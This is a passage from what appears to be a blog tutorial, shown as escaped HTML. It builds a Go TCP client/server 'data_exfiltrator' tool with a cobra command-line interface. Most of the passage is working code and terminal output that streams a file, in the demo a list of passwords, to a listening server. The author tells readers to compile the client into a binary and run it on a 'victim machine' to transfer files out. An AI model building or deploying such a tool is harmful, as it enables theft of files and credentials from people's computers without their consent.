&lt;p&gt;Now our &lt;code&gt;client.go&lt;/code&gt; will be modified to read data from file &lt;code&gt;sample_input.txt&lt;/code&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;package main

import (
    "bufio"
    "fmt"
    "net"
    "os"
)

// there are server details to which client will connect
// we add here the file name to exfiltrate
const (
    connHost = "127.0.0.1"
    connPort = "8080"
    connType = "tcp"
    fileName = "client/sample_input.txt"
)

func main() {

    // connecting to the server
    conn, err := net.Dial(connType, connHost+":"+connPort)
    if err != nil {
        fmt.Println("Not able to connect to ", connHost, "at port", connPort)
        panic(err.Error())
    }
    defer conn.Close()

    // Open the file here
    file, err := os.Open(fileName)
    defer file.Close()
    if err != nil {
        fmt.Println("Not able to read file", fileName)
        panic(err.Error())
    }

    // Create a scanner to read the open file
    scanner := bufio.NewScanner(file)
    for scanner.Scan() {

        // We add \n because scanner.Text() removes the ending newline character
        conn.Write([]byte(scanner.Text() + "\n"))

    }
    fmt.Println("File transferred successfully")
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;We add the &lt;code&gt;const&lt;/code&gt; for file location &lt;code&gt;fileName&lt;/code&gt;. To open a file for reading we use the &lt;code&gt;os&lt;/code&gt; library and for reading the text from a file we use the &lt;code&gt;bufio&lt;/code&gt; scanner.&lt;br&gt;
The problem with the &lt;code&gt;Scanner&lt;/code&gt; is that it removes the newline after reading text from the file. That's why we need to add the newline at the end of the text that we are sending to the connection in &lt;code&gt;conn.Write()&lt;/code&gt; statement. Let's test this !&lt;br&gt;
Terminal -1 run your server normally as there are no changes&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ go run server/server.go                                                                     
Starting tcp server on 127.0.0.1:8080
Listening ...
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Running your &lt;code&gt;client.go&lt;/code&gt; file to send the data&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ go run client/client.go
File transferred successfully
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;If we see the output in the terminal 1, we will be surprised&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ go run server/server.go                                                                     
Starting tcp server on 127.0.0.1:8080
Listening ...
Client 127.0.0.1:34706 connected
Client message:password1
Client left
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;We see that only the first line is being transferred to the server. But why? What happens to the remaining one ?&lt;/p&gt;

&lt;p&gt;The problem is because of the speed with which client is sending the data and the speed with which the server is ready to accept it. As the communication is asynchronous the client is never sure that the server has read the previous message. To make client run a bit slow we will add &lt;code&gt;time.Sleep()&lt;/code&gt; for client to sleep for 5 milliseconds.&lt;br&gt;
This is to be done in the &lt;code&gt;scanner.Scan()&lt;/code&gt; loop&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;&amp;lt;...&amp;gt;
    scanner := bufio.NewScanner(file)
    for scanner.Scan() {

        // We add \n because scanner.Text() removes the ending newline character
        conn.Write([]byte(scanner.Text() + "\n"))

        // sleeping for 5 milliseconds
        time.Sleep(5 * time.Millisecond)

    }
&amp;lt;...&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Now running the &lt;code&gt;client.go&lt;/code&gt; in terminal 2&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ go run client/client.go
File transferred successfully
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;and server in terminal 1&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ go run server/server.go                                                                     
Starting tcp server on 127.0.0.1:8080
Listening ...
Client 127.0.0.1:35510 connected
Client message:password1
Client message:password2
Client message:password3
Client message:password4
Client left
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;We are now able to see all the contents of the file. if this still is not giving you correct answer then try increasing the sleep time to 10, 20 or maybe even 50 milliseconds. But isn't this approach still asynchronous. The client is still unaware of whether the data has been read by the server or not. &lt;/p&gt;

&lt;p&gt;To make this a complete synchronized process we will ask the server to response a &lt;code&gt;yes&lt;/code&gt; or maybe anything as small as one character to declare that it has read the message and simultaneously ask the client to read (and send ) the next line only after receiving this confirmation.&lt;/p&gt;

&lt;p&gt;So to do this will modify the &lt;code&gt;server.go&lt;/code&gt; to write a response in the &lt;code&gt;handleConnection&lt;/code&gt; function&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;func handleConnection(client net.Conn) {
    for {
        buffer, err := bufio.NewReader(client).ReadBytes('\n')
        if err != nil {
            fmt.Println("Client left")
            client.Close()
            return
        }
        fmt.Print("Client message:", string(buffer[:]))

        // send this as a response to the client
        client.Write([]byte("Y"))
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;and in the &lt;code&gt;client.go&lt;/code&gt; to read the response we will modify the for loop of &lt;code&gt;scanner.Scan&lt;/code&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;    scanner := bufio.NewScanner(file)
    for scanner.Scan() {

        // We add \n because scanner.Text() removes the ending newline character
        conn.Write([]byte(scanner.Text() + "\n"))

        // declare a byte variable
        var b = make([]byte, 2, 3)

        // read the response here
        conn.Read(b)

    }
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;We declare a variable and read the response in that variable. Once this is done we will begin reading next line.&lt;/p&gt;

&lt;p&gt;Running this from terminal - 2 for client&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ go run client/client.go
File transferred successfully
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;From terminal - 1 for server&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ go run server/server.go                                                                     
Starting tcp server on 127.0.0.1:8080
Listening ...
Client 127.0.0.1:36584 connected
Client message:password1
Client message:password2
Client message:password3
Client message:password4
Client left
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Now our entire process is synchronous.&lt;/p&gt;

&lt;p&gt;Now if you want you can stop here and modify the host and port to make it workable for your needs. Launch the server in your local and run the client program on the victim machine. Obviously there are high chances that you might not be able to run the go program in the victim machine directly using the &lt;code&gt;go&lt;/code&gt; command so you need to convert it into an executable. For this you can run the following command -&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ cd client

$ go build client.go
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;This will create a binary that you can distribute to the victim and transfer the text files from there.&lt;/p&gt;

&lt;p&gt;If you want to transform the entire thing into a complete tool then follow along to see how we convert server and client to a single application and use arguments for host, port and file paths.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#using-cobra-for-cli-modifications"&gt;
  &lt;/a&gt;
  Using cobra for CLI modifications.
&lt;/h3&gt;

&lt;p&gt;Before diving into this our purpose in this sub-section is to create a tool which run server like this&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;./data_exfiltrator server --host 192.168.56.1 --port 8080 -o output.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;and for the client to exfiltrate &lt;code&gt;password.txt&lt;/code&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;./data_exfiltrator client --host 192.168.56.1 --port 8080 -f password.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;For this we will use &lt;code&gt;cobra&lt;/code&gt; which is used by lot of open-source projects like &lt;code&gt;kubernetes&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;For getting started this is our current folder&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ pwd
~/data_exfiltrator
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;and the directory structure is&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ tree .
.
├── client
│   ├── client.go
│   └── sample_input.txt
└── server
    └── server.go
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;First we need to create a module which we can done by running&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ go mod init example.com/data_exfiltrator
go: creating new go.mod: module example.com/data_exfiltrator
go: to add module requirements and sums:
    go mod tidy

# It will create a go.mod file                                                                                                                                        
$ ls -lrt           
total 12
drwxr-xr-x 2 kai kai 4096 Jan 21 23:51 server
drwxr-xr-x 2 kai kai 4096 Jan 23 21:29 client
-rw-r--r-- 1 kai kai   45 Jan 23 21:31 go.mod
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;To install cobra we need to install its module. Preferably run this from &lt;code&gt;~/data_exfiltrator&lt;/code&gt; directory.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ go get -u github.com/spf13/cobra
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;This will install the module dependency in the &lt;code&gt;go.mod&lt;/code&gt; file and &lt;code&gt;go.sum&lt;/code&gt; file for checksums&lt;/p&gt;

&lt;p&gt;Now we need to set out our &lt;code&gt;PATH&lt;/code&gt; variable to take binaries inside the path &lt;code&gt;GOBIN&lt;/code&gt; as well . To get the &lt;code&gt;GOBIN&lt;/code&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ go env  | grep GOBIN                                                                                                          
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;If the &lt;code&gt;GOBIN&lt;/code&gt; is empty for you search for &lt;code&gt;GOPATH/bin&lt;/code&gt; and add this to your path variable.&lt;br&gt;
To check this run&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ cobra help
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;If this runs successfully then cobra is rightly installed.&lt;/p&gt;

&lt;p&gt;Now we will use cobra to initialize our client APP. The command to do that is&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ cobra init
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;This will initialize your application and you will see lot of files created.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ tree .
.
├── client
│   ├── client.go
│   └── sample_input.txt
├── cmd
│   └── root.go
├── go.mod
├── go.sum
├── LICENSE
├── main.go
└── server
    └── server.go
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Firstly, &lt;code&gt;cobra&lt;/code&gt; creates &lt;code&gt;main.go&lt;/code&gt; from where our application will begin. Secondly, it creates &lt;code&gt;cmd&lt;/code&gt; file which contains &lt;code&gt;root.go&lt;/code&gt;. This is the file which will be executed from &lt;code&gt;main.go&lt;/code&gt; and will contain what we need to do when we run &lt;code&gt;main.go&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;We wish to add sub-commands like &lt;code&gt;client&lt;/code&gt; and &lt;code&gt;server&lt;/code&gt; as described earlier. For this we can run&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ cobra add client

$ cobra add server
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;This will modify the &lt;code&gt;cmd&lt;/code&gt; directory to add two more files named &lt;code&gt;client.go&lt;/code&gt; and &lt;code&gt;server.go&lt;/code&gt;.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ tree .
.
├── client
│   ├── client.go
│   └── sample_input.txt
├── cmd
│   ├── client.go
│   ├── root.go
│   └── server.go
├── go.mod
├── go.sum
├── LICENSE
├── main.go
└── server
    └── server.go
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Our server and client files reside in &lt;code&gt;server/server.go&lt;/code&gt; and &lt;code&gt;client/client.go&lt;/code&gt; which are different from the &lt;code&gt;server.go&lt;/code&gt; and &lt;code&gt;client.go&lt;/code&gt; created by &lt;code&gt;cobra&lt;/code&gt; in &lt;code&gt;cmd&lt;/code&gt; directory.&lt;/p&gt;

&lt;p&gt;When we will run &lt;code&gt;go run main.go client&lt;/code&gt; then the &lt;code&gt;cmd/client.go&lt;/code&gt; will be invoked and when we will execute &lt;code&gt;go run main.go server&lt;/code&gt; then the &lt;code&gt;cmd/server.go&lt;/code&gt; will be invoked.&lt;/p&gt;

&lt;p&gt;Right now if we observe our &lt;code&gt;client/client.go&lt;/code&gt; and &lt;code&gt;server/server.go&lt;/code&gt; are part of &lt;code&gt;main&lt;/code&gt; package. We can't use &lt;code&gt;main&lt;/code&gt; as package for them because we don't want to create separate binaries for them, so we will convert &lt;code&gt;client/client.go&lt;/code&gt; to become package &lt;code&gt;client&lt;/code&gt; and for &lt;code&gt;server/server.go&lt;/code&gt; we will use package name &lt;code&gt;server&lt;/code&gt;. To do this just simply change their package names from &lt;code&gt;main&lt;/code&gt; to &lt;code&gt;client&lt;/code&gt; or &lt;code&gt;server&lt;/code&gt; accordingly.&lt;/p&gt;

&lt;p&gt;Now as we are running these file separately so we will remove the &lt;code&gt;main&lt;/code&gt; function and create different functions for them.&lt;br&gt;
For &lt;code&gt;client/client.go&lt;/code&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;package client

import (
    "bufio"
    "fmt"
    "net"
    "os"
)

const connType = "tcp"

func checkFile(file string) error {
    _, err := os.Stat(file)
    return err
    // check file permissions as well
}

func ExfiltrateFile(fileName, connHost, connPort string) error {

    // stat file
    if checkFile(fileName) != nil {
        return fmt.Errorf("FileNotFound: Not able to find the file %s", fileName)
    }

    // check connection

    fmt.Printf("Connecting %s:%s over %s\n", connHost, connPort, connType)
    conn, err := net.Dial(connType, connHost+":"+connPort)
    if err != nil {
        fmt.Println(err.Error())
        return fmt.Errorf("HostNotReachable: Not able to connect %s:%s", connHost, connPort)
    }
    defer conn.Close()
    //transfer file
    file, err := os.Open(fileName)
    if err != nil {
        return fmt.Errorf("FilePermission: Not able to read file %s", fileName)
    }
    defer file.Close()

    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        var b = make([]byte, 2, 3)

        // We add \n because scanner.Text() removes the ending newline character
        conn.Write([]byte(scanner.Text() + "\n"))

        // Wait for the server message to indicate that the line is written
        conn.Read(b)
    }
    return nil
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;As we notice in the above file we don't have main function, rather we are using &lt;code&gt;ExfiltrateFile&lt;/code&gt; as the function which takes &lt;code&gt;fileName&lt;/code&gt; , &lt;code&gt;connHost&lt;/code&gt; and &lt;code&gt;connPort&lt;/code&gt; as arguments. &lt;/p&gt;

&lt;p&gt;Now try to understand what we are doing here. We will pass option from the shell to accept file names, host and port. They will be passed in the &lt;code&gt;root.go&lt;/code&gt;. &lt;code&gt;root.go&lt;/code&gt; will determine what subcommand we are using, &lt;code&gt;client&lt;/code&gt; or &lt;code&gt;server&lt;/code&gt; by the command we have typed. Suppose if we are running &lt;code&gt;client&lt;/code&gt; sub-command then &lt;code&gt;cmd/client.go&lt;/code&gt; will be invoked with the appropriate flags (file names, host and port passed from shell). Once &lt;code&gt;cmd/client.go&lt;/code&gt; get these flags, it will call &lt;code&gt;ExfiltrateFile()&lt;/code&gt; function from &lt;code&gt;client/client.go&lt;/code&gt; and pass these flags as arguments. The &lt;code&gt;ExfiltrateFile()&lt;/code&gt; function will run the the client logic we built earlier. &lt;/p&gt;

&lt;p&gt;This also goes for &lt;code&gt;server/server.go&lt;/code&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;package server

import (
    "bufio"
    "fmt"
    "net"
    "os"
)

const (
    connType = "tcp"
)

func Serve(fileName, connHost, connPort string) error {

    fmt.Printf("Starting %s server on %s:%s\n", connType, connHost, connPort)
    conn, err := net.Listen(connType, connHost+":"+connPort)
    if err != nil {
        return fmt.Errorf("ConnectionError: Not able to connect %s", connHost+":"+connPort)
    }
    defer conn.Close()

    // running the loop for listening all the connections
    fmt.Println("Listening ... ")
    for {
        // Start accepting the connections
        client, err := conn.Accept()
        if err != nil {
            panic(err.Error())
        }
        fmt.Println("Client", client.RemoteAddr().String(), "connected")
        go handleClientConnection(client, fileName)
        fmt.Println("You can press Ctrl+c to terminate the program")
    }
}

func handleClientConnection(conn net.Conn, fileName string) {
    // handling buffer writes
    // it take the connection and then creates the buffer
    file, err := os.Create(fileName)
    if err != nil {
        panic(err)
    }
    defer close(file)
    for {
        buffer, err := bufio.NewReader(conn).ReadBytes('\n')
        if err != nil {
            fmt.Println("Client left")
            conn.Close()
            return
        }
        file.WriteString(string(buffer[:]))

        // Sending a reply back to client for synchronous connection
        conn.Write([]byte("Y\n"))
    }

}
func close(file *os.File) {
    fmt.Println("Closing the file")
    fmt.Println()
    fmt.Println("Listening ... (press Ctrl+c to terminate)")
    file.Close()
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Here we use the &lt;code&gt;Serve&lt;/code&gt; function to start a TCP server by accepting file name, host and port as parameters&lt;/p&gt;

&lt;p&gt;If we carefully observe the &lt;code&gt;handleConnection&lt;/code&gt; function then we are now outputting everything to a file and not to the console. This file name is received from the &lt;code&gt;--output&lt;/code&gt; or &lt;code&gt;-o&lt;/code&gt; option in the &lt;code&gt;cmd/server.go&lt;/code&gt; file.&lt;/p&gt;

&lt;p&gt;Now our client and server logic is ready to be used. We just need to modify the &lt;code&gt;cmd/client.go&lt;/code&gt; and &lt;code&gt;cmd/server.go&lt;/code&gt; to pass the flags to the &lt;code&gt;client&lt;/code&gt; and &lt;code&gt;server&lt;/code&gt; accordingly.&lt;br&gt;
So the &lt;code&gt;cmd/client.go&lt;/code&gt; is&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;package cmd

import (
    "log"

    "github.com/dunefro/data_exfiltrator/client"
    "github.com/spf13/cobra"
)

// clientCmd represents the client command
var clientCmd = &amp;amp;cobra.Command{
    Use:   "client",
    Short: "to run the client",
    Long:  `Running the client for data exfiltrator`,
    Run: func(cmd *cobra.Command, args []string) {

        fileName, _ := cmd.Flags().GetString("file")
        host, _ := cmd.Flags().GetString("host")
        port, _ := cmd.Flags().GetString("port")

        err := client.ExfiltrateFile(fileName, host, port)
        if err != nil {
            log.Println("Failed to transfer the file")
            log.Fatal(err.Error())
        } else {
            log.Println("Successful: File was transferred")
        }

    },
}

func init() {
    rootCmd.AddCommand(clientCmd)

    // defining flags for client
    clientCmd.PersistentFlags().StringP("file", "f", "", "file(text) name which you want to transfer (required)")
    clientCmd.MarkPersistentFlagRequired("file")
    clientCmd.PersistentFlags().StringP("host", "", "127.0.0.1", "host that you wish to connect")
    clientCmd.PersistentFlags().StringP("port", "p", "8080", "port that you wish to connect")

}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;In the &lt;code&gt;init()&lt;/code&gt; function we have flags that are available with the &lt;code&gt;client&lt;/code&gt; sub-command. These are &lt;code&gt;file&lt;/code&gt;, &lt;code&gt;host&lt;/code&gt; and &lt;code&gt;port&lt;/code&gt; which can be invoked with &lt;code&gt;--&lt;/code&gt; for shell arguments. We have only marked one of the options as mandatory with &lt;code&gt;client&lt;/code&gt; sub-command i.e. &lt;code&gt;file&lt;/code&gt;. Logically the client must pass some file to exfiltrate. If &lt;code&gt;host&lt;/code&gt; and &lt;code&gt;port&lt;/code&gt; are not specified then we will use default value &lt;code&gt;127.0.0.1&lt;/code&gt; and &lt;code&gt;8080&lt;/code&gt;. This is mentioned in the 3rd argument of each flag. We can use the small option &lt;code&gt;p&lt;/code&gt; for port as &lt;code&gt;-p&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Once this is initialized the function in the &lt;code&gt;Run&lt;/code&gt; will be executed and we can get all the values passed for each argument in the command invoked by using &lt;code&gt;cmd.Flags()&lt;/code&gt;. So&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;fileName, _ := cmd.Flags().GetString("file")
host, _ := cmd.Flags().GetString("host")
port, _ := cmd.Flags().GetString("port")
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;This gives the value of &lt;code&gt;fileName&lt;/code&gt;, &lt;code&gt;host&lt;/code&gt; and &lt;code&gt;port&lt;/code&gt; passed in the command. Once we have them we invoke the &lt;code&gt;ExfiltrateFile()&lt;/code&gt; function from the &lt;code&gt;client/client.go&lt;/code&gt; which we have imported in the &lt;code&gt;cmd/client.go&lt;/code&gt; by&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;"example.com/data_exfiltrator/client"
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;and so now to call the exfiltrate function&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;client.ExfiltrateFile(fileName, host, port)
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;This happens for &lt;code&gt;server.go&lt;/code&gt; as well&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;package cmd

import (
    "fmt"

    "example.com/data_exfiltrator/server"
    "github.com/spf13/cobra"
)

// serverCmd represents the server command
var serverCmd = &amp;amp;cobra.Command{
    Use:   "server",
    Short: "creating server",
    Long:  `This will create a server at a specified port for connection and output to directed file`,
    Run: func(cmd *cobra.Command, args []string) {
        fileName, _ := cmd.Flags().GetString("output")
        host, _ := cmd.Flags().GetString("host")
        port, _ := cmd.Flags().GetString("port")

        err := server.Serve(fileName, host, port)
        if err != nil {
            fmt.Println(err.Error())
        }
    },
}

func init() {
    rootCmd.AddCommand(serverCmd)

    // defining flags
    serverCmd.PersistentFlags().StringP("output", "o", "", "output(text file) to transfer the data (required)")
    serverCmd.MarkPersistentFlagRequired("output")
    serverCmd.PersistentFlags().StringP("host", "", "127.0.0.1", "host that you wish to connect")
    serverCmd.PersistentFlags().StringP("port", "p", "8080", "port that you wish to connect")
}

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;For the &lt;code&gt;serve&lt;/code&gt; sub-command we are using &lt;code&gt;output&lt;/code&gt; as the option for outputting what we receive from the client. This is a compulsory option and must be passed when invoking &lt;code&gt;server&lt;/code&gt; sub-command. We have &lt;code&gt;host&lt;/code&gt; and &lt;code&gt;port&lt;/code&gt; similar to &lt;code&gt;client&lt;/code&gt; sub-command. We call the server function by -&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;server.Serve(fileName, host, port)
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;and pass the output file, host and port.&lt;/p&gt;

&lt;p&gt;Finally the &lt;code&gt;root.go&lt;/code&gt; will be&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;package cmd

import (
    "os"

    "github.com/spf13/cobra"
)

// rootCmd represents the base command when called without any subcommands
var rootCmd = &amp;amp;cobra.Command{
    Use:   "data_exfiltrator [command]",
    Short: "Exfiltrate your files from one location to another",
    Long:  `Application to build data exfiltrator`,
    // Uncomment the following line if your bare application
    // has an action associated with it:
    // Run: func(cmd *cobra.Command, args []string) { },
}

// Execute adds all child commands to the root command and sets flags appropriately.
// This is called by main.main(). It only needs to happen once to the rootCmd.
func Execute() {
    err := rootCmd.Execute()
    if err != nil {
        os.Exit(1)
    }
}

func init() {
    // Here you will define your flags and configuration settings.
    // Cobra supports persistent flags, which, if defined here,
    // will be global for your application.

    // rootCmd.PersistentFlags().StringVar(&amp;amp;cfgFile, "config", "", "config file (default is $HOME/.data_exfiltrator.yaml)")

    // Cobra also supports local flags, which will only run
    // when this action is called directly.
    // rootCmd.Flags().BoolP("toggle", "t", false, "Help message for toggle")
    // Add version here
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;For &lt;code&gt;root.go&lt;/code&gt; we have disabled the &lt;code&gt;Run&lt;/code&gt; flag to hold any function. This is because we don't want to do anything until a sub-command like &lt;code&gt;client&lt;/code&gt; or &lt;code&gt;server&lt;/code&gt; is passed to it.&lt;/p&gt;

&lt;p&gt;So now we will build everything and test. To build&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ go build
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;This will create a binary called &lt;code&gt;data_exfiltrator&lt;/code&gt;. Run this binary simply by&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ ./data_exfiltrator                                               
Application to build data exfiltrator

Usage:
  data_exfiltrator [command]

Available Commands:
  client      to run the client
  completion  Generate the autocompletion script for the specified shell
  help        Help about any command
  server      creating server

Flags:
  -h, --help   help for data_exfiltrator

Use "data_exfiltrator [command] --help" for more information about a command.
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;We will try to run a server&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ ./data_exfiltrator server -o something.txt  --host 192.168.56.178 --port 8080
Starting tcp server on 192.168.56.178:8080
Listening ...
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Now we will try to run the client&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ ./data_exfiltrator client
Error: required flag(s) "file" not set
Usage:
  data_exfiltrator client [flags]

Flags:
  -f, --file string   file(text) name which you want to transfer (required)
  -h, --help          help for client
      --host string   host that you wish to connect (default "127.0.0.1")
  -p, --port string   port that you wish to connect (default "8080")
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;This will fail because as we have mentioned we need to pass the option &lt;code&gt;--file&lt;/code&gt; for this, so&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ ./data_exfiltrator client -f client/sample_input.txt --host 192.168.56.178 --port 8080
Connecting 192.168.56.178:8080 over tcp
2022/01/23 22:43:27 Successful: File was transferred
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The terminal 1 where server ran is now showing&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ ./data_exfiltrator server -o something.txt  --host 192.168.56.178 --port 8080
Starting tcp server on 192.168.56.178:8080
Listening ... 
Client 192.168.56.178:34154 connected
You can press Ctrl+c to terminate the program
Client left
Closing the file

Listening ... (press Ctrl+c to terminate)
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Press Ctrl+C to check the file &lt;code&gt;something.txt&lt;/code&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ cat something.txt         
password1
password2
password3
password4
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The file is &lt;strong&gt;exfiltrated&lt;/strong&gt;.&lt;/p&gt;

&lt;h3&gt;
